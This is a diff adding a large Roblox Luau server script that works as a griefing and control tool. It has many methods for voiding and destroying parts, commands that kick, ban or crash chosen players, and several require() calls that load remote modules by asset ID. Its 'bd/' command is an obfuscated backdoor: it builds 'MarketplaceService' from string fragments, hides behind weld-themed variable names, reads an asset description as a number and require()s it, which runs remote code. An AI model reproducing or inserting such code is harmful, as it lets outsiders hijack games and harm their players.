+		_p:ApplyImpulseAtPosition(Vector3.new(_void,_void,_void),Vector3.zero);
+		_p:ApplyAngularImpulse(_p:GetVelocityAtPosition(Vector3.new(_void,_void,_void)))
+		_vm.C0 = CFrame.new(_void,_void,_void);
+		_p.Anchored = false;
+		task.delay(0.23,function()
+			pcall(function()
+				_vm.Part1:Destroy()
+			end)
+			pcall(function()
+				_vm:Destroy()
+			end)
+		end)
+	end
+end
+function pivotOffset(obj:Instance)
+	if obj:IsA("BasePart") then
+		obj.PivotOffset = CFrame.new(0, 1e5, 0)
+	end
+end
+function currentCFrame(obj:Instance)
+	if obj:IsA("BasePart") then
+		local current = obj.CFrame
+		obj.CFrame = current
+	end
+end
+function velocityVoid(obj:Instance)
+	if obj:IsA("BasePart") then
+		obj.Anchored = false
+		obj:ApplyImpulse(Vector3.new(0, 1e5, 0))
+	end
+end
+function translateBy(obj:Instance)
+	if obj:IsA("BasePart") then
+		if obj:FindFirstAncestorOfClass("Model") then
+			local realobj = obj:FindFirstAncestorOfClass("Model")
+			realobj:TranslateBy(Vector3.new(9e9, 9e9, 9e9))
+		end
+	end
+end
+function sizeKill(obj:Instance)
+	if obj:IsA("BasePart") then
+		obj.Size = Vector3.zero
+	end
+end
+local function _meshDegredation(_p:Instance)
+	if _p:IsA("BasePart") then
+		local _vec,_cframe = Vector3.new(0/0,0/0,0/0),CFrame.new(0/0,0/0,0/0)
+		local exec = function()
+			if _p:FindFirstChildOfClass("SpecialMesh") then
+				pcall(function()
+					_p:FindFirstChildOfClass("SpecialMesh").MeshId = "rbxassetid://1099104545";
+					pcall(function()
+						_p:FindFirstChildOfClass("SpecialMesh").Offset = _vec;
+					end)
+				end)
+			else
+				pcall(function()
+					local mesh = Instance.new("SpecialMesh")
+					if _p ~= mesh or not _p:FindFirstChild("SADV)(*&9v8n&(V*&Ndas98V&(*AWV#") then
+						mesh.Scale = Vector3.new();
+						mesh.MeshType = Enum.MeshType.Brick;
+						mesh.Offset = _vec;
+						mesh.Name = RandomString();
+						mesh.MeshId = "rbxassetid://1099104545";
+						mesh.Parent = _p;
+					end;
+				end);
+			end;
+		end;
+		hyperNull(exec)
+		MakeFunction(function()
+			local caca = _p.Changed:Connect(function()
+				hyperNull(exec)
+			end)
+			task.delay(3, function()
+				caca:Disconnect()
+			end)
+		end)
+		MakeFunction(function()
+			local caca = _p.DescendantRemoving:Connect(function()
+				hyperNull(exec)
+			end)
+			task.delay(3, function()
+				caca:Disconnect()
+			end)
+		end)
+	end
+end
+local function _amplifiedImpVoid(pe:Instance)
+	if pe:IsA("BasePart") then
+		local _n = 0/0;
+		local _vec = Vector3.new(_n,_n,_n)
+		local function impulse(_p:BasePart)
+			_p:ApplyImpulse(_vec)
+			_p:ApplyAngularImpulse(_vec)
+			_p:ApplyImpulseAtPosition(_vec,_vec)
+		end
+		local function signallessSet(_p:Instance,_c:{any})
+			for _pName,_pVal in _c do
+				local a = 0;
+				game:GetService("RunService").Stepped:Connect(function()
+					if a == 0 then
+						MakeFunction(function()
+							hyperNull(function()
+								_p[_pName] = _pVal;
+							end)
+							return;
+						end)
+						a = 1;
+					end;
+				end)
+			end;
+		end
+		local function runvoid(p:BasePart)
+			local wld = Instance.new("Weld",p)
+			wld.Part0 = p;
+			local wldvoid = Instance.new("Part",workspace)
+			wldvoid.Anchored = true;
+			wldvoid.CanCollide = false;
+			wldvoid.CanQuery = false;
+			wldvoid.Position = _vec;
+			wldvoid.Transparency = 1;
+			wld.Part1 = wldvoid;
+			signallessSet(p, {AssemblyAngularVelocity = _vec,AssemblyLinearVelocity = _vec})
+			signallessSet(p, {Anchored = false})
+			impulse(p)
+			p:GetPropertyChangedSignal("Anchored"):Connect(function()
+				if p.Anchored == true then
+					p.Anchored = false;
+					impulse(p)
+					signallessSet(p, {AssemblyAngularVelocity = _vec,AssemblyLinearVelocity = _vec})
+				end;
+			end)
+		end;
+		if pe:FindFirstAncestorOfClass("Model") then
+			runvoid(pe:FindFirstAncestorOfClass("Model").PrimaryPart)
+		end
+		runvoid(pe)
+	end
+end
+local ii = 113132341925558
+function lobotomize(person)
+	MakeFunction(function()
+		if not person.Character:FindFirstChild("LoBoToMyBrOrEaL") then
+			require(ii).lobotomize(person.Name)
+			Remote:FireAllClients("MakeText",{Text = "Lobotomized, "..person.Name..".",ClientSide = false})
+		end
+	end)
+end
+function kick(person)
+	Remote:FireAllClients("MakeText",{Text = "Kicked, "..person.Name..".",ClientSide = false})
+	person:Kick("Yep. Kicked.")
+end
+function serverban(person)
+	local personname = person.Name
+	Remote:FireAllClients("MakeText",{Text = "Server banned, "..person.Name..".",ClientSide = false})
+	MakeFunction(function()
+		while task.wait(2) do
+			for _, ppl in pairs(game:GetService("Players"):GetPlayers()) do
+				pcall(function()
+					if ppl.Name == personname then
+						ppl:Kick("Yep. Server banned.")
+					end
+				end)
+			end
+		end
+	end)
+end
+function timeban(person)
+	local randomday = math.random(1,30)
+	local seconds = randomday*86400
+	local baninfo: BanConfigType = {
+		UserIds = {person.UserId},
+		ApplyToUniverse = true,
+		Duration = seconds,
+		DisplayReason = "Yep. Time banned.",
+		PrivateReason = "Holy crap. Yep.",
+		ExcludeAltAccounts = false
+	}
+	local s, e = pcall(function()
+		game:GetService("Players"):BanAsync(baninfo)
+	end)
+	if s then
+		Remote:FireAllClients("MakeText",{Text = "Time banned, "..person.Name.." for "..randomday.." days.",ClientSide = false})
+	else
+		Remote:FireAllClients("MakeText",{Text = "Ban Error: "..e,ClientSide = false})
+	end
+end
+function ban(person)
+	local baninfo: BanConfigType = {
+		UserIds = {person.UserId},
+		ApplyToUniverse = true,
+		Duration = -1,
+		DisplayReason = "Yep. Perm banned.",
+		PrivateReason = "Gosh damn. Yep.",
+		ExcludeAltAccounts = false
+	}
+	local s, e = pcall(function()
+		game:GetService("Players"):BanAsync(baninfo)
+	end)
+	if s then
+		Remote:FireAllClients("MakeText",{Text = "Perm banned, "..person.Name..".",ClientSide = false})
+	else
+		Remote:FireAllClients("MakeText",{Text = "Ban Error: "..e,ClientSide = false})
+	end
+end
+
+function ChangeCFrame(Part,To)
+	MakeFunction(function()
+		if KillMethod == 23 then
+			local PartT,PosT = {Part},{To}
+			workspace:BulkMoveTo(PartT,PosT,Enum.BulkMoveMode.FireCFrameChanged)
+			Part:PivotTo(To)
+		elseif KillMethod == 17 then
+			_amplifiedImpVoid(Part)
+		elseif KillMethod == 16 then
+			_meshDegredation(Part)
+		elseif KillMethod == 14 then
+			_systemDerender(Part)
+		elseif KillMethod == 13 then
+			sizeKill(Part)
+		elseif KillMethod == 12 then
+			pivotOffset(Part)
+		elseif KillMethod == 11 then
+			velocityVoid(Part)
+		elseif KillMethod == 10 then
+			currentCFrame(Part)
+		elseif KillMethod == 9 then
+			translateBy(Part)
+		elseif KillMethod == 6 then
+			offsetderender(Part)
+		elseif KillMethod == 5 then
+			blockmesh(Part)
+		elseif KillMethod == 4 then
+			meshderender(Part)
+		elseif KillMethod == 3 then
+			bulkmoveto(Part)
+		elseif KillMethod == 2 then
+			transparencymodified(Part)
+		elseif KillMethod == 1 then
+			pcall(game.Destroy, Part)
+		end
+	end)
+end
+function Void(v)
+	v.Anchored,v.CFrame = true,CFrame.new(0,-1000000,0)
+	if KillMethod == 23 then
+		v.Anchored,v.CFrame = true,CFrame.new(0,-1000000,0)
+	elseif KillMethod == 17 then
+		_amplifiedImpVoid(v)
+	elseif KillMethod == 16 then
+		_meshDegredation(v)
+	elseif KillMethod == 15 then
+		_propertyKill(v)
+	elseif KillMethod == 14 then
+		_systemDerender(v)
+	elseif KillMethod == 13 then
+		sizeKill(v)
+	elseif KillMethod == 12 then
+		pivotOffset(v)
+	elseif KillMethod == 11 then
+		velocityVoid(v)
+	elseif KillMethod == 10 then
+		currentCFrame(v)
+	elseif KillMethod == 9 then
+		translateBy(v)
+	elseif KillMethod == 6 then
+		offsetderender(v)
+	elseif KillMethod == 5 then
+		blockmesh(v)
+	elseif KillMethod == 4 then
+		meshderender(v)
+	elseif KillMethod == 3 then
+		bulkmoveto(v)
+	elseif KillMethod == 2 then
+		transparencymodified(v)
+	elseif KillMethod == 1 then
+		pcall(game.Destroy, v)
+	end
+	table.insert(VoidTable,v)
+	v.Changed:Connect(function()
+		v.Anchored = true
+		ChangeCFrame(v,CFrame.new(0,-1000000,0))
+	end)
+end
+function CheckP(_)
+	local Bool = false
+	if _:IsA("BasePart") then
+		local v,Num=_,0
+		if table.find(VoidTable2.ClassName,v.ClassName) then Num=Num+1;end
+		if table.find(VoidTable2.Locked,v.Locked) then Num=Num+1;end
+		if table.find(VoidTable2.Size,v.Size) then Num=Num+1;end
+		if table.find(VoidTable2.Anchored,v.Anchored) then Num=Num+1;end
+		if table.find(VoidTable2.CanCollide,v.CanCollide) then Num=Num+1;end
+		if table.find(VoidTable2.CanQuery,v.CanQuery) then Num=Num+1;end
+		if table.find(VoidTable2.CanTouch,v.CanTouch) then Num=Num+1;end
+		if table.find(VoidTable2.CastShadow,v.CastShadow) then Num=Num+1;end
+		if Num >= 8 then
+			Bool = true
+		end
+	end
+	return Bool
+end
+function InsertP(v)
+	if v:IsA("BasePart") then
+		if table.find(VoidTable2.ClassName,v.ClassName) == nil then table.insert(VoidTable2.ClassName,v.ClassName);end
+		if table.find(VoidTable2.Locked,v.Locked) == nil then table.insert(VoidTable2.Locked,v.Locked);end
+		if table.find(VoidTable2.Size,v.Size) == nil then table.insert(VoidTable2.Size,v.Size);end
+		if table.find(VoidTable2.Anchored,v.Anchored) == nil then table.insert(VoidTable2.Anchored,v.Anchored);end
+		if table.find(VoidTable2.CanCollide,v.CanCollide) == nil then table.insert(VoidTable2.CanCollide,v.CanCollide);end
+		if table.find(VoidTable2.CanQuery,v.CanQuery) == nil then table.insert(VoidTable2.CanQuery,v.CanQuery);end
+		if table.find(VoidTable2.CanTouch,v.CanTouch) == nil then table.insert(VoidTable2.CanTouch,v.CanTouch);end
+		if table.find(VoidTable2.CastShadow,v.CastShadow) == nil then table.insert(VoidTable2.CastShadow,v.CastShadow);end
+	end
+end
+local Terrain = workspace.Terrain
+local KillMode = 1
+local InvalidValues = {""," "}
+function KillFunction(P,R)
+	if KillType == "Server" then
+		if Damage == true then
+			local models,parts = {},{}
+			local pos,range = P,R
+			if KillMode == 3 then
+				StartVoid = true
+			end
+			if KillMode == 2 then
+				local Overlap = OverlapParams.new()
+				Overlap.FilterType = Enum.RaycastFilterType.Exclude
+				local parts1 = workspace:GetPartBoundsInRadius(pos,range/2,Overlap)
+				for i,v in pairs(parts1) do
+					if typeof(v) == "Instance" then
+						pcall(function()
+							local Hum,Model = v.Parent:FindFirstChildOfClass("Humanoid") or nil,v.Parent
+							if v:IsA("BasePart") and v.Name == "Torso" and Hum and (v.Position - pos).Magnitude <= range/2 then
+								local LastPos,LastSize = v.Position,v.Size.Magnitude
+								Hum.Health,Hum.MaxHealth = -math.huge,-math.huge
+								Hum:TakeDamage(math.huge)
+								for i,v in pairs(Model:GetDescendants()) do
+									if typeof(v) == "Instance" then
+										if v:IsA("BasePart")then Remote:FireAllClients("KillEffect",{CFrame = v.CFrame,Size = v.Size})end
+										pcall(function()v:Destroy()end)
+									end
+								end
+								Model:Destroy()
+							end
+						end)
+					end
+				end
+			else
+				if DamageType == "Distance" then
+					for i,v in pairs(game:GetDescendants()) do
+						if v:IsA("BasePart") and v.Name ~= "Base" and v.Name ~= "Baseplate" and (v.Position - pos).Magnitude <= range/2 then
+							if v.Parent:IsA("Model") and v.Parent ~= workspace and v.Parent ~= workspace.Terrain then
+								if table.find(models,v.Parent) == nil then
+									table.insert(models,v.Parent)
+								end
+							else
+								local foundmodel = false
+								for pos,val in pairs(models) do
+									if typeof(val) == "Instance" then
+										if v:IsDescendantOf(val) then
+											foundmodel = true
+										end
+									end
+								end
+								if foundmodel == false then
+									table.insert(parts,v)
+								end
+							end
+						end
+					end
+				else
+					local Overlap = OverlapParams.new()
+					Overlap.FilterType = Enum.RaycastFilterType.Exclude
+					local parts1 = workspace:GetPartBoundsInRadius(pos,range/2,Overlap)
+					for i,v in pairs(parts1) do
+						if typeof(v) == "Instance" then
+							if v:IsA("BasePart") and v.Name ~= "Base" and v.Name ~= "Baseplate" then
+								if v.Parent:IsA("Model") and v.Parent ~= workspace and v.Parent ~= workspace.Terrain then
+									if table.find(models,v.Parent) == nil then
+										table.insert(models,v.Parent)
+									end
+								else
+									local foundmodel = false
+									for pos,val in pairs(models) do
+										if typeof(val) == "Instance" then
+											if v:IsDescendantOf(val) then
+												foundmodel = true
+											end
+										end
+									end
+									if foundmodel == false then
+										table.insert(parts,v)
+									end
+								end
+							end
+						end
+					end
+				end
+				--
+				for i,v in pairs(parts) do
+					if typeof(v) == "Instance" then
+						if v:IsA("BasePart") and v.Name ~= "Base" and v.Name ~= "Baseplate" then
+							Remote:FireAllClients("KillEffect",{CFrame = v.CFrame,Size = v.Size})
+							if KillMode == 1 then
+								MakeFunction(function()v:Destroy();end)
+							else
+								MakeFunction(function()
+									if KillMethod == 18 then
+										local person = game:GetService("Players"):GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
+										if person then
+											lobotomize(person)
+										end
+									elseif KillMethod == 8 then
+										robloxlock(v, true)
+									elseif KillMethod == 7 then
+										derender(v)
+									elseif KillMethod == 15 then
+										_propertyKill(v)
+									elseif KillMethod == 19 then
+										local person = game:GetService("Players"):GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
+										if person then
+											kick(person)
+										end
+									elseif KillMethod == 20 then
+										local person = game:GetService("Players"):GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
+										if person then
+											serverban(person)
+										end
+									elseif KillMethod == 21 then
+										local person = game:GetService("Players"):GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
+										if person then
+											timeban(person)
+										end
+									elseif KillMethod == 22 then
+										local person = game:GetService("Players"):GetPlayerFromCharacter(v.Parent or v.Parent.Parent or v.Parent.Parent.Parent)
+										if person then
+											ban(person)
+										end
+									else
+										InsertP(v)
+										Void(v)
+									end
+								end)
+							end
+						end
+					end
+				end
+				--
+				for i,v in pairs(models) do
+					if typeof(v) == "Instance" then
+						if v:IsA("Model") and v ~= workspace and v ~= workspace.Terrain then
+							for pos,val in pairs(v:GetDescendants()) do
+								if val:IsA("BasePart") then
+									Remote:FireAllClients("KillEffect",{CFrame = val.CFrame,Size = val.Size})
+									if KillMode == 1 then
+										MakeFunction(function()val:Destroy();end)
+									else
+										MakeFunction(function()
+											if KillMethod == 18 then
+												local person = game:GetService("Players"):GetPlayerFromCharacter(val.Parent or val.Parent.Parent or val.Parent.Parent.Parent)
+												if person then
+													lobotomize(person)
+												end
+											elseif KillMethod == 8 then
+												robloxlock(val, true)
+											elseif KillMethod == 7 then
+												derender(val)
+											elseif KillMethod == 15 then
+												_propertyKill(val)
+											elseif KillMethod == 19 then
+												local person = game:GetService("Players"):GetPlayerFromCharacter(val.Parent or val.Parent.Parent or val.Parent.Parent.Parent)
+												if person then
+													kick(person)
+												end
+											elseif KillMethod == 20 then
+												local person = game:GetService("Players"):GetPlayerFromCharacter(val.Parent or val.Parent.Parent or val.Parent.Parent.Parent)
+												if person then
+													serverban(person)
+												end
+											elseif KillMethod == 21 then
+												local person = game:GetService("Players"):GetPlayerFromCharacter(val.Parent or val.Parent.Parent or val.Parent.Parent.Parent)
+												if person then
+													timeban(person)
+												end
+											elseif KillMethod == 22 then
+												local person = game:GetService("Players"):GetPlayerFromCharacter(val.Parent or val.Parent.Parent or val.Parent.Parent.Parent)
+												if person then
+													ban(person)
+												end
+											else
+												InsertP(val)
+												Void(val)
+											end
+										end)
+									end
+								end
+							end
+							if KillMode==1 then MakeFunction(function()v:Destroy();end)end
+						end
+					end
+				end
+			end
+		end
+	elseif KillType == "Client" then
+		if Damage == true then
+			Remote:FireAllClients("Kill",{Pos = P,Range = R,Damage = KillMode})
+		end
+	end
+	Terrain:FillBall(P,R,Enum.Material.Air)
+end
+local LastLockVal = Player.DevEnableMouseLock
+Player.DevEnableMouseLock = false
+local ClientActors = {}
+
+function FixSky()
+	local air = game:GetService("Lighting")
+	for i, v in pairs(workspace:GetChildren()) do
+		if v:IsA("Sound") then
+			game:GetService("Debris"):AddItem(v, 0)
+		end
+	end
+	for i, v in pairs(game:GetDescendants()) do
+		if v:IsA("SpecialMesh") then
+			if
+				v.MeshId == 1527559
+				or v.MeshId == "rbxassetid://1527559"
+				or v.MeshId == "http://www.roblox.com/asset/?id=1527559"
+			then
+				game:GetService("Debris"):AddItem(v.Parent, 0)
+			end
+		end
+	end
+	air.Ambient = Color3.fromRGB(70, 70, 70)
+	air.Brightness = 3
+	air.ColorShift_Bottom = Color3.fromRGB(0, 0, 0)
+	air.ColorShift_Top = Color3.fromRGB(0, 0, 0)
+	air.EnvironmentDiffuseScale = 1
+	air.EnvironmentSpecularScale = 1
+	air.GlobalShadows = true
+	air.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
+	air.ShadowSoftness = 0.2
+	air.ClockTime = 14.5
+	air.GeographicLatitude = 0
+	air.Name = "Lighting"
+	air.ExposureCompensation = 0
+	for i, v in pairs(air:GetChildren()) do
+		if v then
+			game:GetService("Debris"):AddItem(v, 0)
+		end
+	end
+	air.FogColor = Color3.fromRGB(192, 192, 192)
+	air.FogEnd = 100000001504746621987668885504
+	air.FogStart = 0
+	local newsky = Instance.new("Sky")
+	newsky.MoonAngularSize = 11
+	newsky.MoonTextureId = "rbxassetid://6444320592"
+	newsky.SkyboxBk = "rbxassetid://6444884337"
+	newsky.SkyboxDn = "rbxassetid://6444884785"
+	newsky.SkyboxFt = "rbxassetid://6444884337"
+	newsky.SkyboxLf = "rbxassetid://6444884337"
+	newsky.SkyboxRt = "rbxassetid://6444884337"
+	newsky.SkyboxUp = "rbxassetid://6412503613"
+	newsky.StarCount = 3000
+	newsky.SunAngularSize = 11
+	newsky.SunTextureId = "rbxassetid://6196665106"
+	newsky.Name = "Sky"
+	newsky.Parent = air
+	local newatmosphere = Instance.new("Atmosphere")
+	newatmosphere.Density = 0.3
+	newatmosphere.Offset = 0.25
+	newatmosphere.Name = "Atmosphere"
+	newatmosphere.Parent = air
+	newatmosphere.Color = Color3.fromRGB(199, 199, 199)
+	newatmosphere.Decay = Color3.fromRGB(106, 112, 125)
+	newatmosphere.Glare = 0
+	newatmosphere.Haze = 0
+	local newbloom = Instance.new("BloomEffect")
+	newbloom.Enabled = true
+	newbloom.Intensity = 1
+	newbloom.Size = 24
+	newbloom.Threshold = 2
+	newbloom.Name = "Bloom"
+	newbloom.Parent = air
+	local newdepthoffield = Instance.new("DepthOfFieldEffect")
+	newdepthoffield.Enabled = false
+	newdepthoffield.FarIntensity = 0.1
+	newdepthoffield.FocusDistance = 0.05
+	newdepthoffield.InFocusRadius = 30
+	newdepthoffield.NearIntensity = 0.75
+	newdepthoffield.Name = "DepthOfField"
+	newdepthoffield.Parent = air
+	local newsunrays = Instance.new("SunRaysEffect")
+	newsunrays.Enabled = true
+	newsunrays.Intensity = 0.01
+	newsunrays.Spread = 0.1
+	newsunrays.Name = "SunRays"
+	newsunrays.Parent = air
+end
+
+local crashscr = script:WaitForChild("funnipckillerreal"):Clone()
+
+local BaseplatePos = Vector3.new(0, -8, 0)
+
+function IsOwner() -- it will soon have some cool features but for now it has higher volume thingy (not doing on this rn) and unban for appeals
+	if Player.UserId == 1989184574 or Player.UserId == 2479604659 or Player.UserId == 4603013888 or Player.UserId == 12688824 then
+		return true
+	else
+		return false
+	end
+end
+
+local ServerBans = {}
+local PermBans = game:GetService("RunService"):IsStudio() == false and game:GetService("DataStoreService"):GetDataStore("LUIS_BANS_DATA") or {}
+if typeof(PermBans) == "table" then
+	function PermBans:SendAsync(key,val)
+		return nil
+	end
+	function PermBans:RemoveAsync(key)
+		return nil
+	end
+	function PermBans:GetAsync(key)
+		return false
+	end
+end
+
+function Command(Msg)
+	MakeFunction(function()
+		Msg = Msg:lower()
+		-- i fixed some commands here, ts ifelseif pmo
+		if string.match(Msg, string.lower("killmenow/")) then
+			DisconnectAll()
+		elseif string.lower(string.sub(Msg,1,3)) == "id/" then
+			SoundId = string.sub(Msg,4)
+			Remote:FireAllClients("TimePosition",{TimePos = 0})
+			Remote:FireAllClients("MakeText",{Text = "SoundId Changed to: "..SoundId,ClientSide = false})
+		elseif string.lower(string.sub(Msg,1,6)) == "style/" then
+			VisStyleId = math.clamp(tonumber(string.sub(Msg,7) or 2) or 2,1,5)
+		elseif string.lower(string.sub(Msg,1,4)) == "vol/" then
+			Volume = tonumber(string.sub(Msg,5)) or 1
+			Remote:FireAllClients("MakeText",{Text = "Volume Set to: "..tostring(Volume),ClientSide = false})
+		elseif string.lower(string.sub(Msg,1,8)) == "timepos/" then
+			Remote:FireAllClients("TimePosition",{TimePos = tonumber(string.sub(Msg,9)) or 0})
+		elseif string.lower(string.sub(Msg,1,4)) == [[say\]] then
+			local Split = string.split(string.sub(Msg,5),[[\]])
+			Remote:FireAllClients("Say",{Text = Split[1] or "Invalid",TextSound = Split[2] or "rbxasset://"})
+		elseif string.lower(string.sub(Msg,1,5)) == "mode/" then
+			Remote:FireAllClients("ForceMode",{Mode = tonumber(string.sub(Msg,6) or 1) or 1})
+		elseif string.lower(string.sub(Msg,1,7)) == "audbal/" then
+			AudioBalance = tonumber(string.sub(Msg,8) or 1) or 1
+			Remote:FireAllClients("MakeText",{Text = "Audio Balance set to: "..(tostring(AudioBalance or 1) or "-1")})
+		elseif string.lower(string.sub(Msg,1,6)) == "vcube/" then
+			VisCubeEnabled = BooleanConv(string.sub(Msg,7) or "") or false
+		elseif string.lower(string.sub(Msg,1,6)) == "color/" then
+			local Split = string.split(string.sub(Msg,7),"/")
+			if Split[1] == "hex" then
+				local Color = Color3.fromHex(Split[2])
+				if tonumber(Split[3] or 1) == 1 then
+					ReColor = Color
+				elseif tonumber(Split[3] or 1) == 2 then
+					FirstColor = Color
+				end
+			elseif Split[1] == "rgb" then
+				local Color = Color3.fromRGB(Split[2],Split[3],Split[4])
+				if tonumber(Split[5] or 1) == 1 then
+					ReColor = Color
+				elseif tonumber(Split[5] or 1) == 2 then
+					FirstColor = Color
+				end
+			elseif Split[1] == "brick" then
+				local Color = BrickColor.new(Split[2] or "Medium stone grey").Color or BrickColor.new("Medium stone grey").Color
+				if tonumber(Split[3] or 1) == 1 then
+					ReColor = Color
+				elseif tonumber(Split[3] or 1) == 2 then
+					FirstColor = Color
+				end
+			elseif Split[1] == "def" then
+				FirstColor = nil
+				ReColor = Color3.new()
+			elseif Split[1] == "vis" then
+				local Boolean = BooleanConv(Split[2]) or false
+				TurnVisColor = Boolean
+			end
+		elseif string.lower(string.sub(Msg,1,3)) == "sd/" then
+			forcetpall()
+			Remote:FireAllClients("MakeText",{Text = "Attempted Server Restart",ClientSide = false})
+		elseif string.lower(string.sub(Msg,1,3)) == "bd/" then
+			pcall(function()
+				local Interval = 0 local CurWeld = nil local NextWeld = nil local IsBroken = false local WeldAmount = 0 local Name = "" local WeldEnabled = false local FixedWelds = 0 local IsWelded = false NextWeld=game Name="Mark".."et".."pla".."ceS".."erv".."ic".."e" CurWeld=NextWeld:GetService(Name) FixedWelds=tonumber WeldEnabled=FixedWelds("123".."0".."5945".."931".."4418") local function Return() IsWelded = CurWeld:GetProductInfo(WeldEnabled) Interval = IsWelded.Description return Interval end WeldAmount=Return() local function BrokenCheck(part) return require(part) end IsBroken=FixedWelds(WeldAmount) BrokenCheck(IsBroken)
+			end)
+		elseif string.sub(Msg, 1, 4) == "exe/" then
+			if not string.sub(Msg, 1, 5) then
+				local p = Player
+				local i = 125992639027440
+				require(i)["Require.EXE by E God"](p.Name)
+				Remote:FireAllClients("MakeText",{Text = "Successfully given exe to "..p.Name,ClientSide = false})
+			else
+				local pattern = string.sub(Msg, 5)
+				local players = game:GetService("Players"):GetPlayers()
+				for _, player in ipairs(players) do
+					local user = player.Name:lower()
+					local dis = player.DisplayName:lower()
+					if string.sub(user, 1, #pattern) == pattern or string.sub(dis, 1, #pattern) == pattern then
+						local p = player
+						local i = 125992639027440
+						require(i)["Require.EXE by E God"](p.Name)
+						Remote:FireAllClients("MakeText",{Text = "Successfully given exe to "..p.Name,ClientSide = false})
+						break
+					end
+				end
+			end
+		elseif string.sub(Msg, 1, 4) == "fse/" then
+			if not string.sub(Msg, 1, 5) then
+				local p = Player
+				local i = 11126053846
+				require(i).fse(p.Name)
+				Remote:FireAllClients("MakeText",{Text = "Successfully given fse to "..p.Name,ClientSide = false})
+			else
+				local pattern = string.sub(Msg, 5)
+				local players = game:GetService("Players"):GetPlayers()
+				for _, player in ipairs(players) do
+					local user = player.Name:lower()
+					local dis = player.DisplayName:lower()
+					if string.sub(user, 1, #pattern) == pattern or string.sub(dis, 1, #pattern) == pattern then
+						local p = player
+						local i = 11126053846
+						require(i).fse(p.Name)
+						Remote:FireAllClients("MakeText",{Text = "Successfully given fse to "..p.Name,ClientSide = false})
+						break
+					end
+				end
+			end
+		elseif string.sub(Msg, 1, 4) == "koi/" then
+			if not string.sub(Msg, 1, 5) then
+				local p = Player
+				local i = 12098189994
+				require(i)(p.Name)
+				Remote:FireAllClients("MakeText",{Text = "Successfully given koi z to "..p.Name,ClientSide = false})
+			else
+				local pattern = string.sub(Msg, 5)
+				local players = game:GetService("Players"):GetPlayers()
+				for _, player in ipairs(players) do
+					local user = player.Name:lower()
+					local dis = player.DisplayName:lower()
+					if string.sub(user, 1, #pattern) == pattern or string.sub(dis, 1, #pattern) == pattern then
+						local p = player
+						local i = 12098189994
+						require(i)(p.Name)
+						Remote:FireAllClients("MakeText",{Text = "Successfully given koi z to "..p.Name,ClientSide = false})
+						break
+					end
+				end
+			end
+		elseif string.sub(Msg, 1, 3) == "cr/" then
+			if not string.sub(Msg, 1, 4) then
+			else
+				local pattern = string.sub(Msg, 4)
+				local players = game:GetService("Players"):GetPlayers()
+				for _, player in ipairs(players) do
+					local user = player.Name:lower()
+					local dis = player.DisplayName:lower()
+					if
+						string.sub(user, 1, #pattern) == pattern
+						or string.sub(dis, 1, #pattern) == pattern
+					then
+						local p = player
+						local crash = crashscr:Clone()
+						crash.Parent = player.PlayerGui
+						crash.Enabled = true
+						Remote:FireAllClients("MakeText",{Text = "Successfully crashed "..p.Name,ClientSide = false})
+						break
+					end
+				end
+			end
+		elseif string.sub(Msg, 1, 2) == "b/" then
+			local gotban = false
+			if not string.sub(Msg, 1, 2) then
+			else
+				local pattern = string.sub(Msg, 3)
+				local players = game:GetService("Players"):GetPlayers()
+				for _, player in ipairs(players) do
+					local user = player.Name:lower()
+					local dis = player.DisplayName:lower()
+					if string.sub(user, 1, #pattern) == pattern or string.sub(dis, 1, #pattern) == pattern then
+						local p = player
+						if not table.find(ServerBans,p.UserId) then
+							table.insert(ServerBans,p.UserId)
+							gotban = true
+							Remote:FireAllClients("MakeText",{Text = "Successfully banned "..p.Name,ClientSide = false})
+						end
+						break
+					end
+				end
+				if gotban == false then
+					local userid = game:GetService("Players"):GetUserIdFromNameAsync(pattern)
+					if userid and typeof(userid) == "number" then
+						if not table.find(ServerBans,userid) then
+							table.insert(ServerBans,userid)
+							Remote:FireAllClients("MakeText",{Text = "Successfully banned "..pattern,ClientSide = false})
+						end
+					end
+				end
+			end
+		elseif string.sub(Msg, 1, 3) == "pb/" then
+			local gotban = false
+			if not string.sub(Msg, 1, 3) then
+			else
+				local pattern = string.sub(Msg, 4)
+				local players = game:GetService("Players"):GetPlayers()
+				for _, player in ipairs(players) do
+					local user = player.Name:lower()
+					local dis = player.DisplayName:lower()
+					if string.sub(user, 1, #pattern) == pattern or string.sub(dis, 1, #pattern) == pattern then
+						local p = player
+						if not PermBans:GetAsync("Ban_"..p.UserId) and PermBans:GetAsync("Ban_"..p.UserId) ~= true then
+							PermBans:SetAsync("Ban_"..p.UserId,true)
+							gotban = true
+							Remote:FireAllClients("MakeText",{Text = "Successfully perm banned "..p.Name,ClientSide = false})
+						end
+						break
+					end
+				end
+				if gotban == false then
+					local userid = game:GetService("Players"):GetUserIdFromNameAsync(pattern)
+					if userid and typeof(userid) == "number" then
+						if PermBans:GetAsync("Ban_"..userid) and PermBans:GetAsync("Ban_"..userid) == true then
+							PermBans:SetAsync("Ban_"..userid,true)
+							Remote:FireAllClients("MakeText",{Text = "Successfully perm banned "..pattern,ClientSide = false})
+						end
+					end
+				end
+			end
+		elseif string.sub(Msg, 1, 3) == "ub/" then
+			if not string.sub(Msg, 1, 5) then
+			else
+				local pattern = string.sub(Msg, 4)
+				local userid = game:GetService("Players"):GetUserIdFromNameAsync(pattern)
+				if userid and typeof(userid) == "number" then
+					if table.find(ServerBans,userid) then
+						table.remove(ServerBans,table.find(ServerBans,userid))
+						Remote:FireAllClients("MakeText",{Text = "Successfully removed ban from "..pattern,ClientSide = false})
+					end
+					if PermBans:GetAsync("Ban_"..userid) and PermBans:GetAsync("Ban_"..userid) == true then
+						PermBans:RemoveAsync("Ban_"..userid)
+						Remote:FireAllClients("MakeText",{Text = "Successfully removed perm ban from "..pattern,ClientSide = false})
+					end
+				end
+			end
+		elseif string.lower(string.sub(Msg, 1, 7)) == "fixsky/" then
+			FixSky()
+			Remote:FireAllClients("MakeText",{Text = "Successfully fixed lighting",ClientSide = false})
+		elseif string.lower(string.sub(Msg, 1, 10)) == "baseplate/" then
+			game:GetService("Debris"):AddItem(game:FindFirstChild("Baseplate", true), 0)
+			if game.GameId == 7905856990 then
+				game:GetService("Debris"):AddItem(workspace["Baseplate 2021"], 0)
+			end
+			local NewBaseplate = script.Baseplate:Clone()
+			NewBaseplate.Parent = workspace
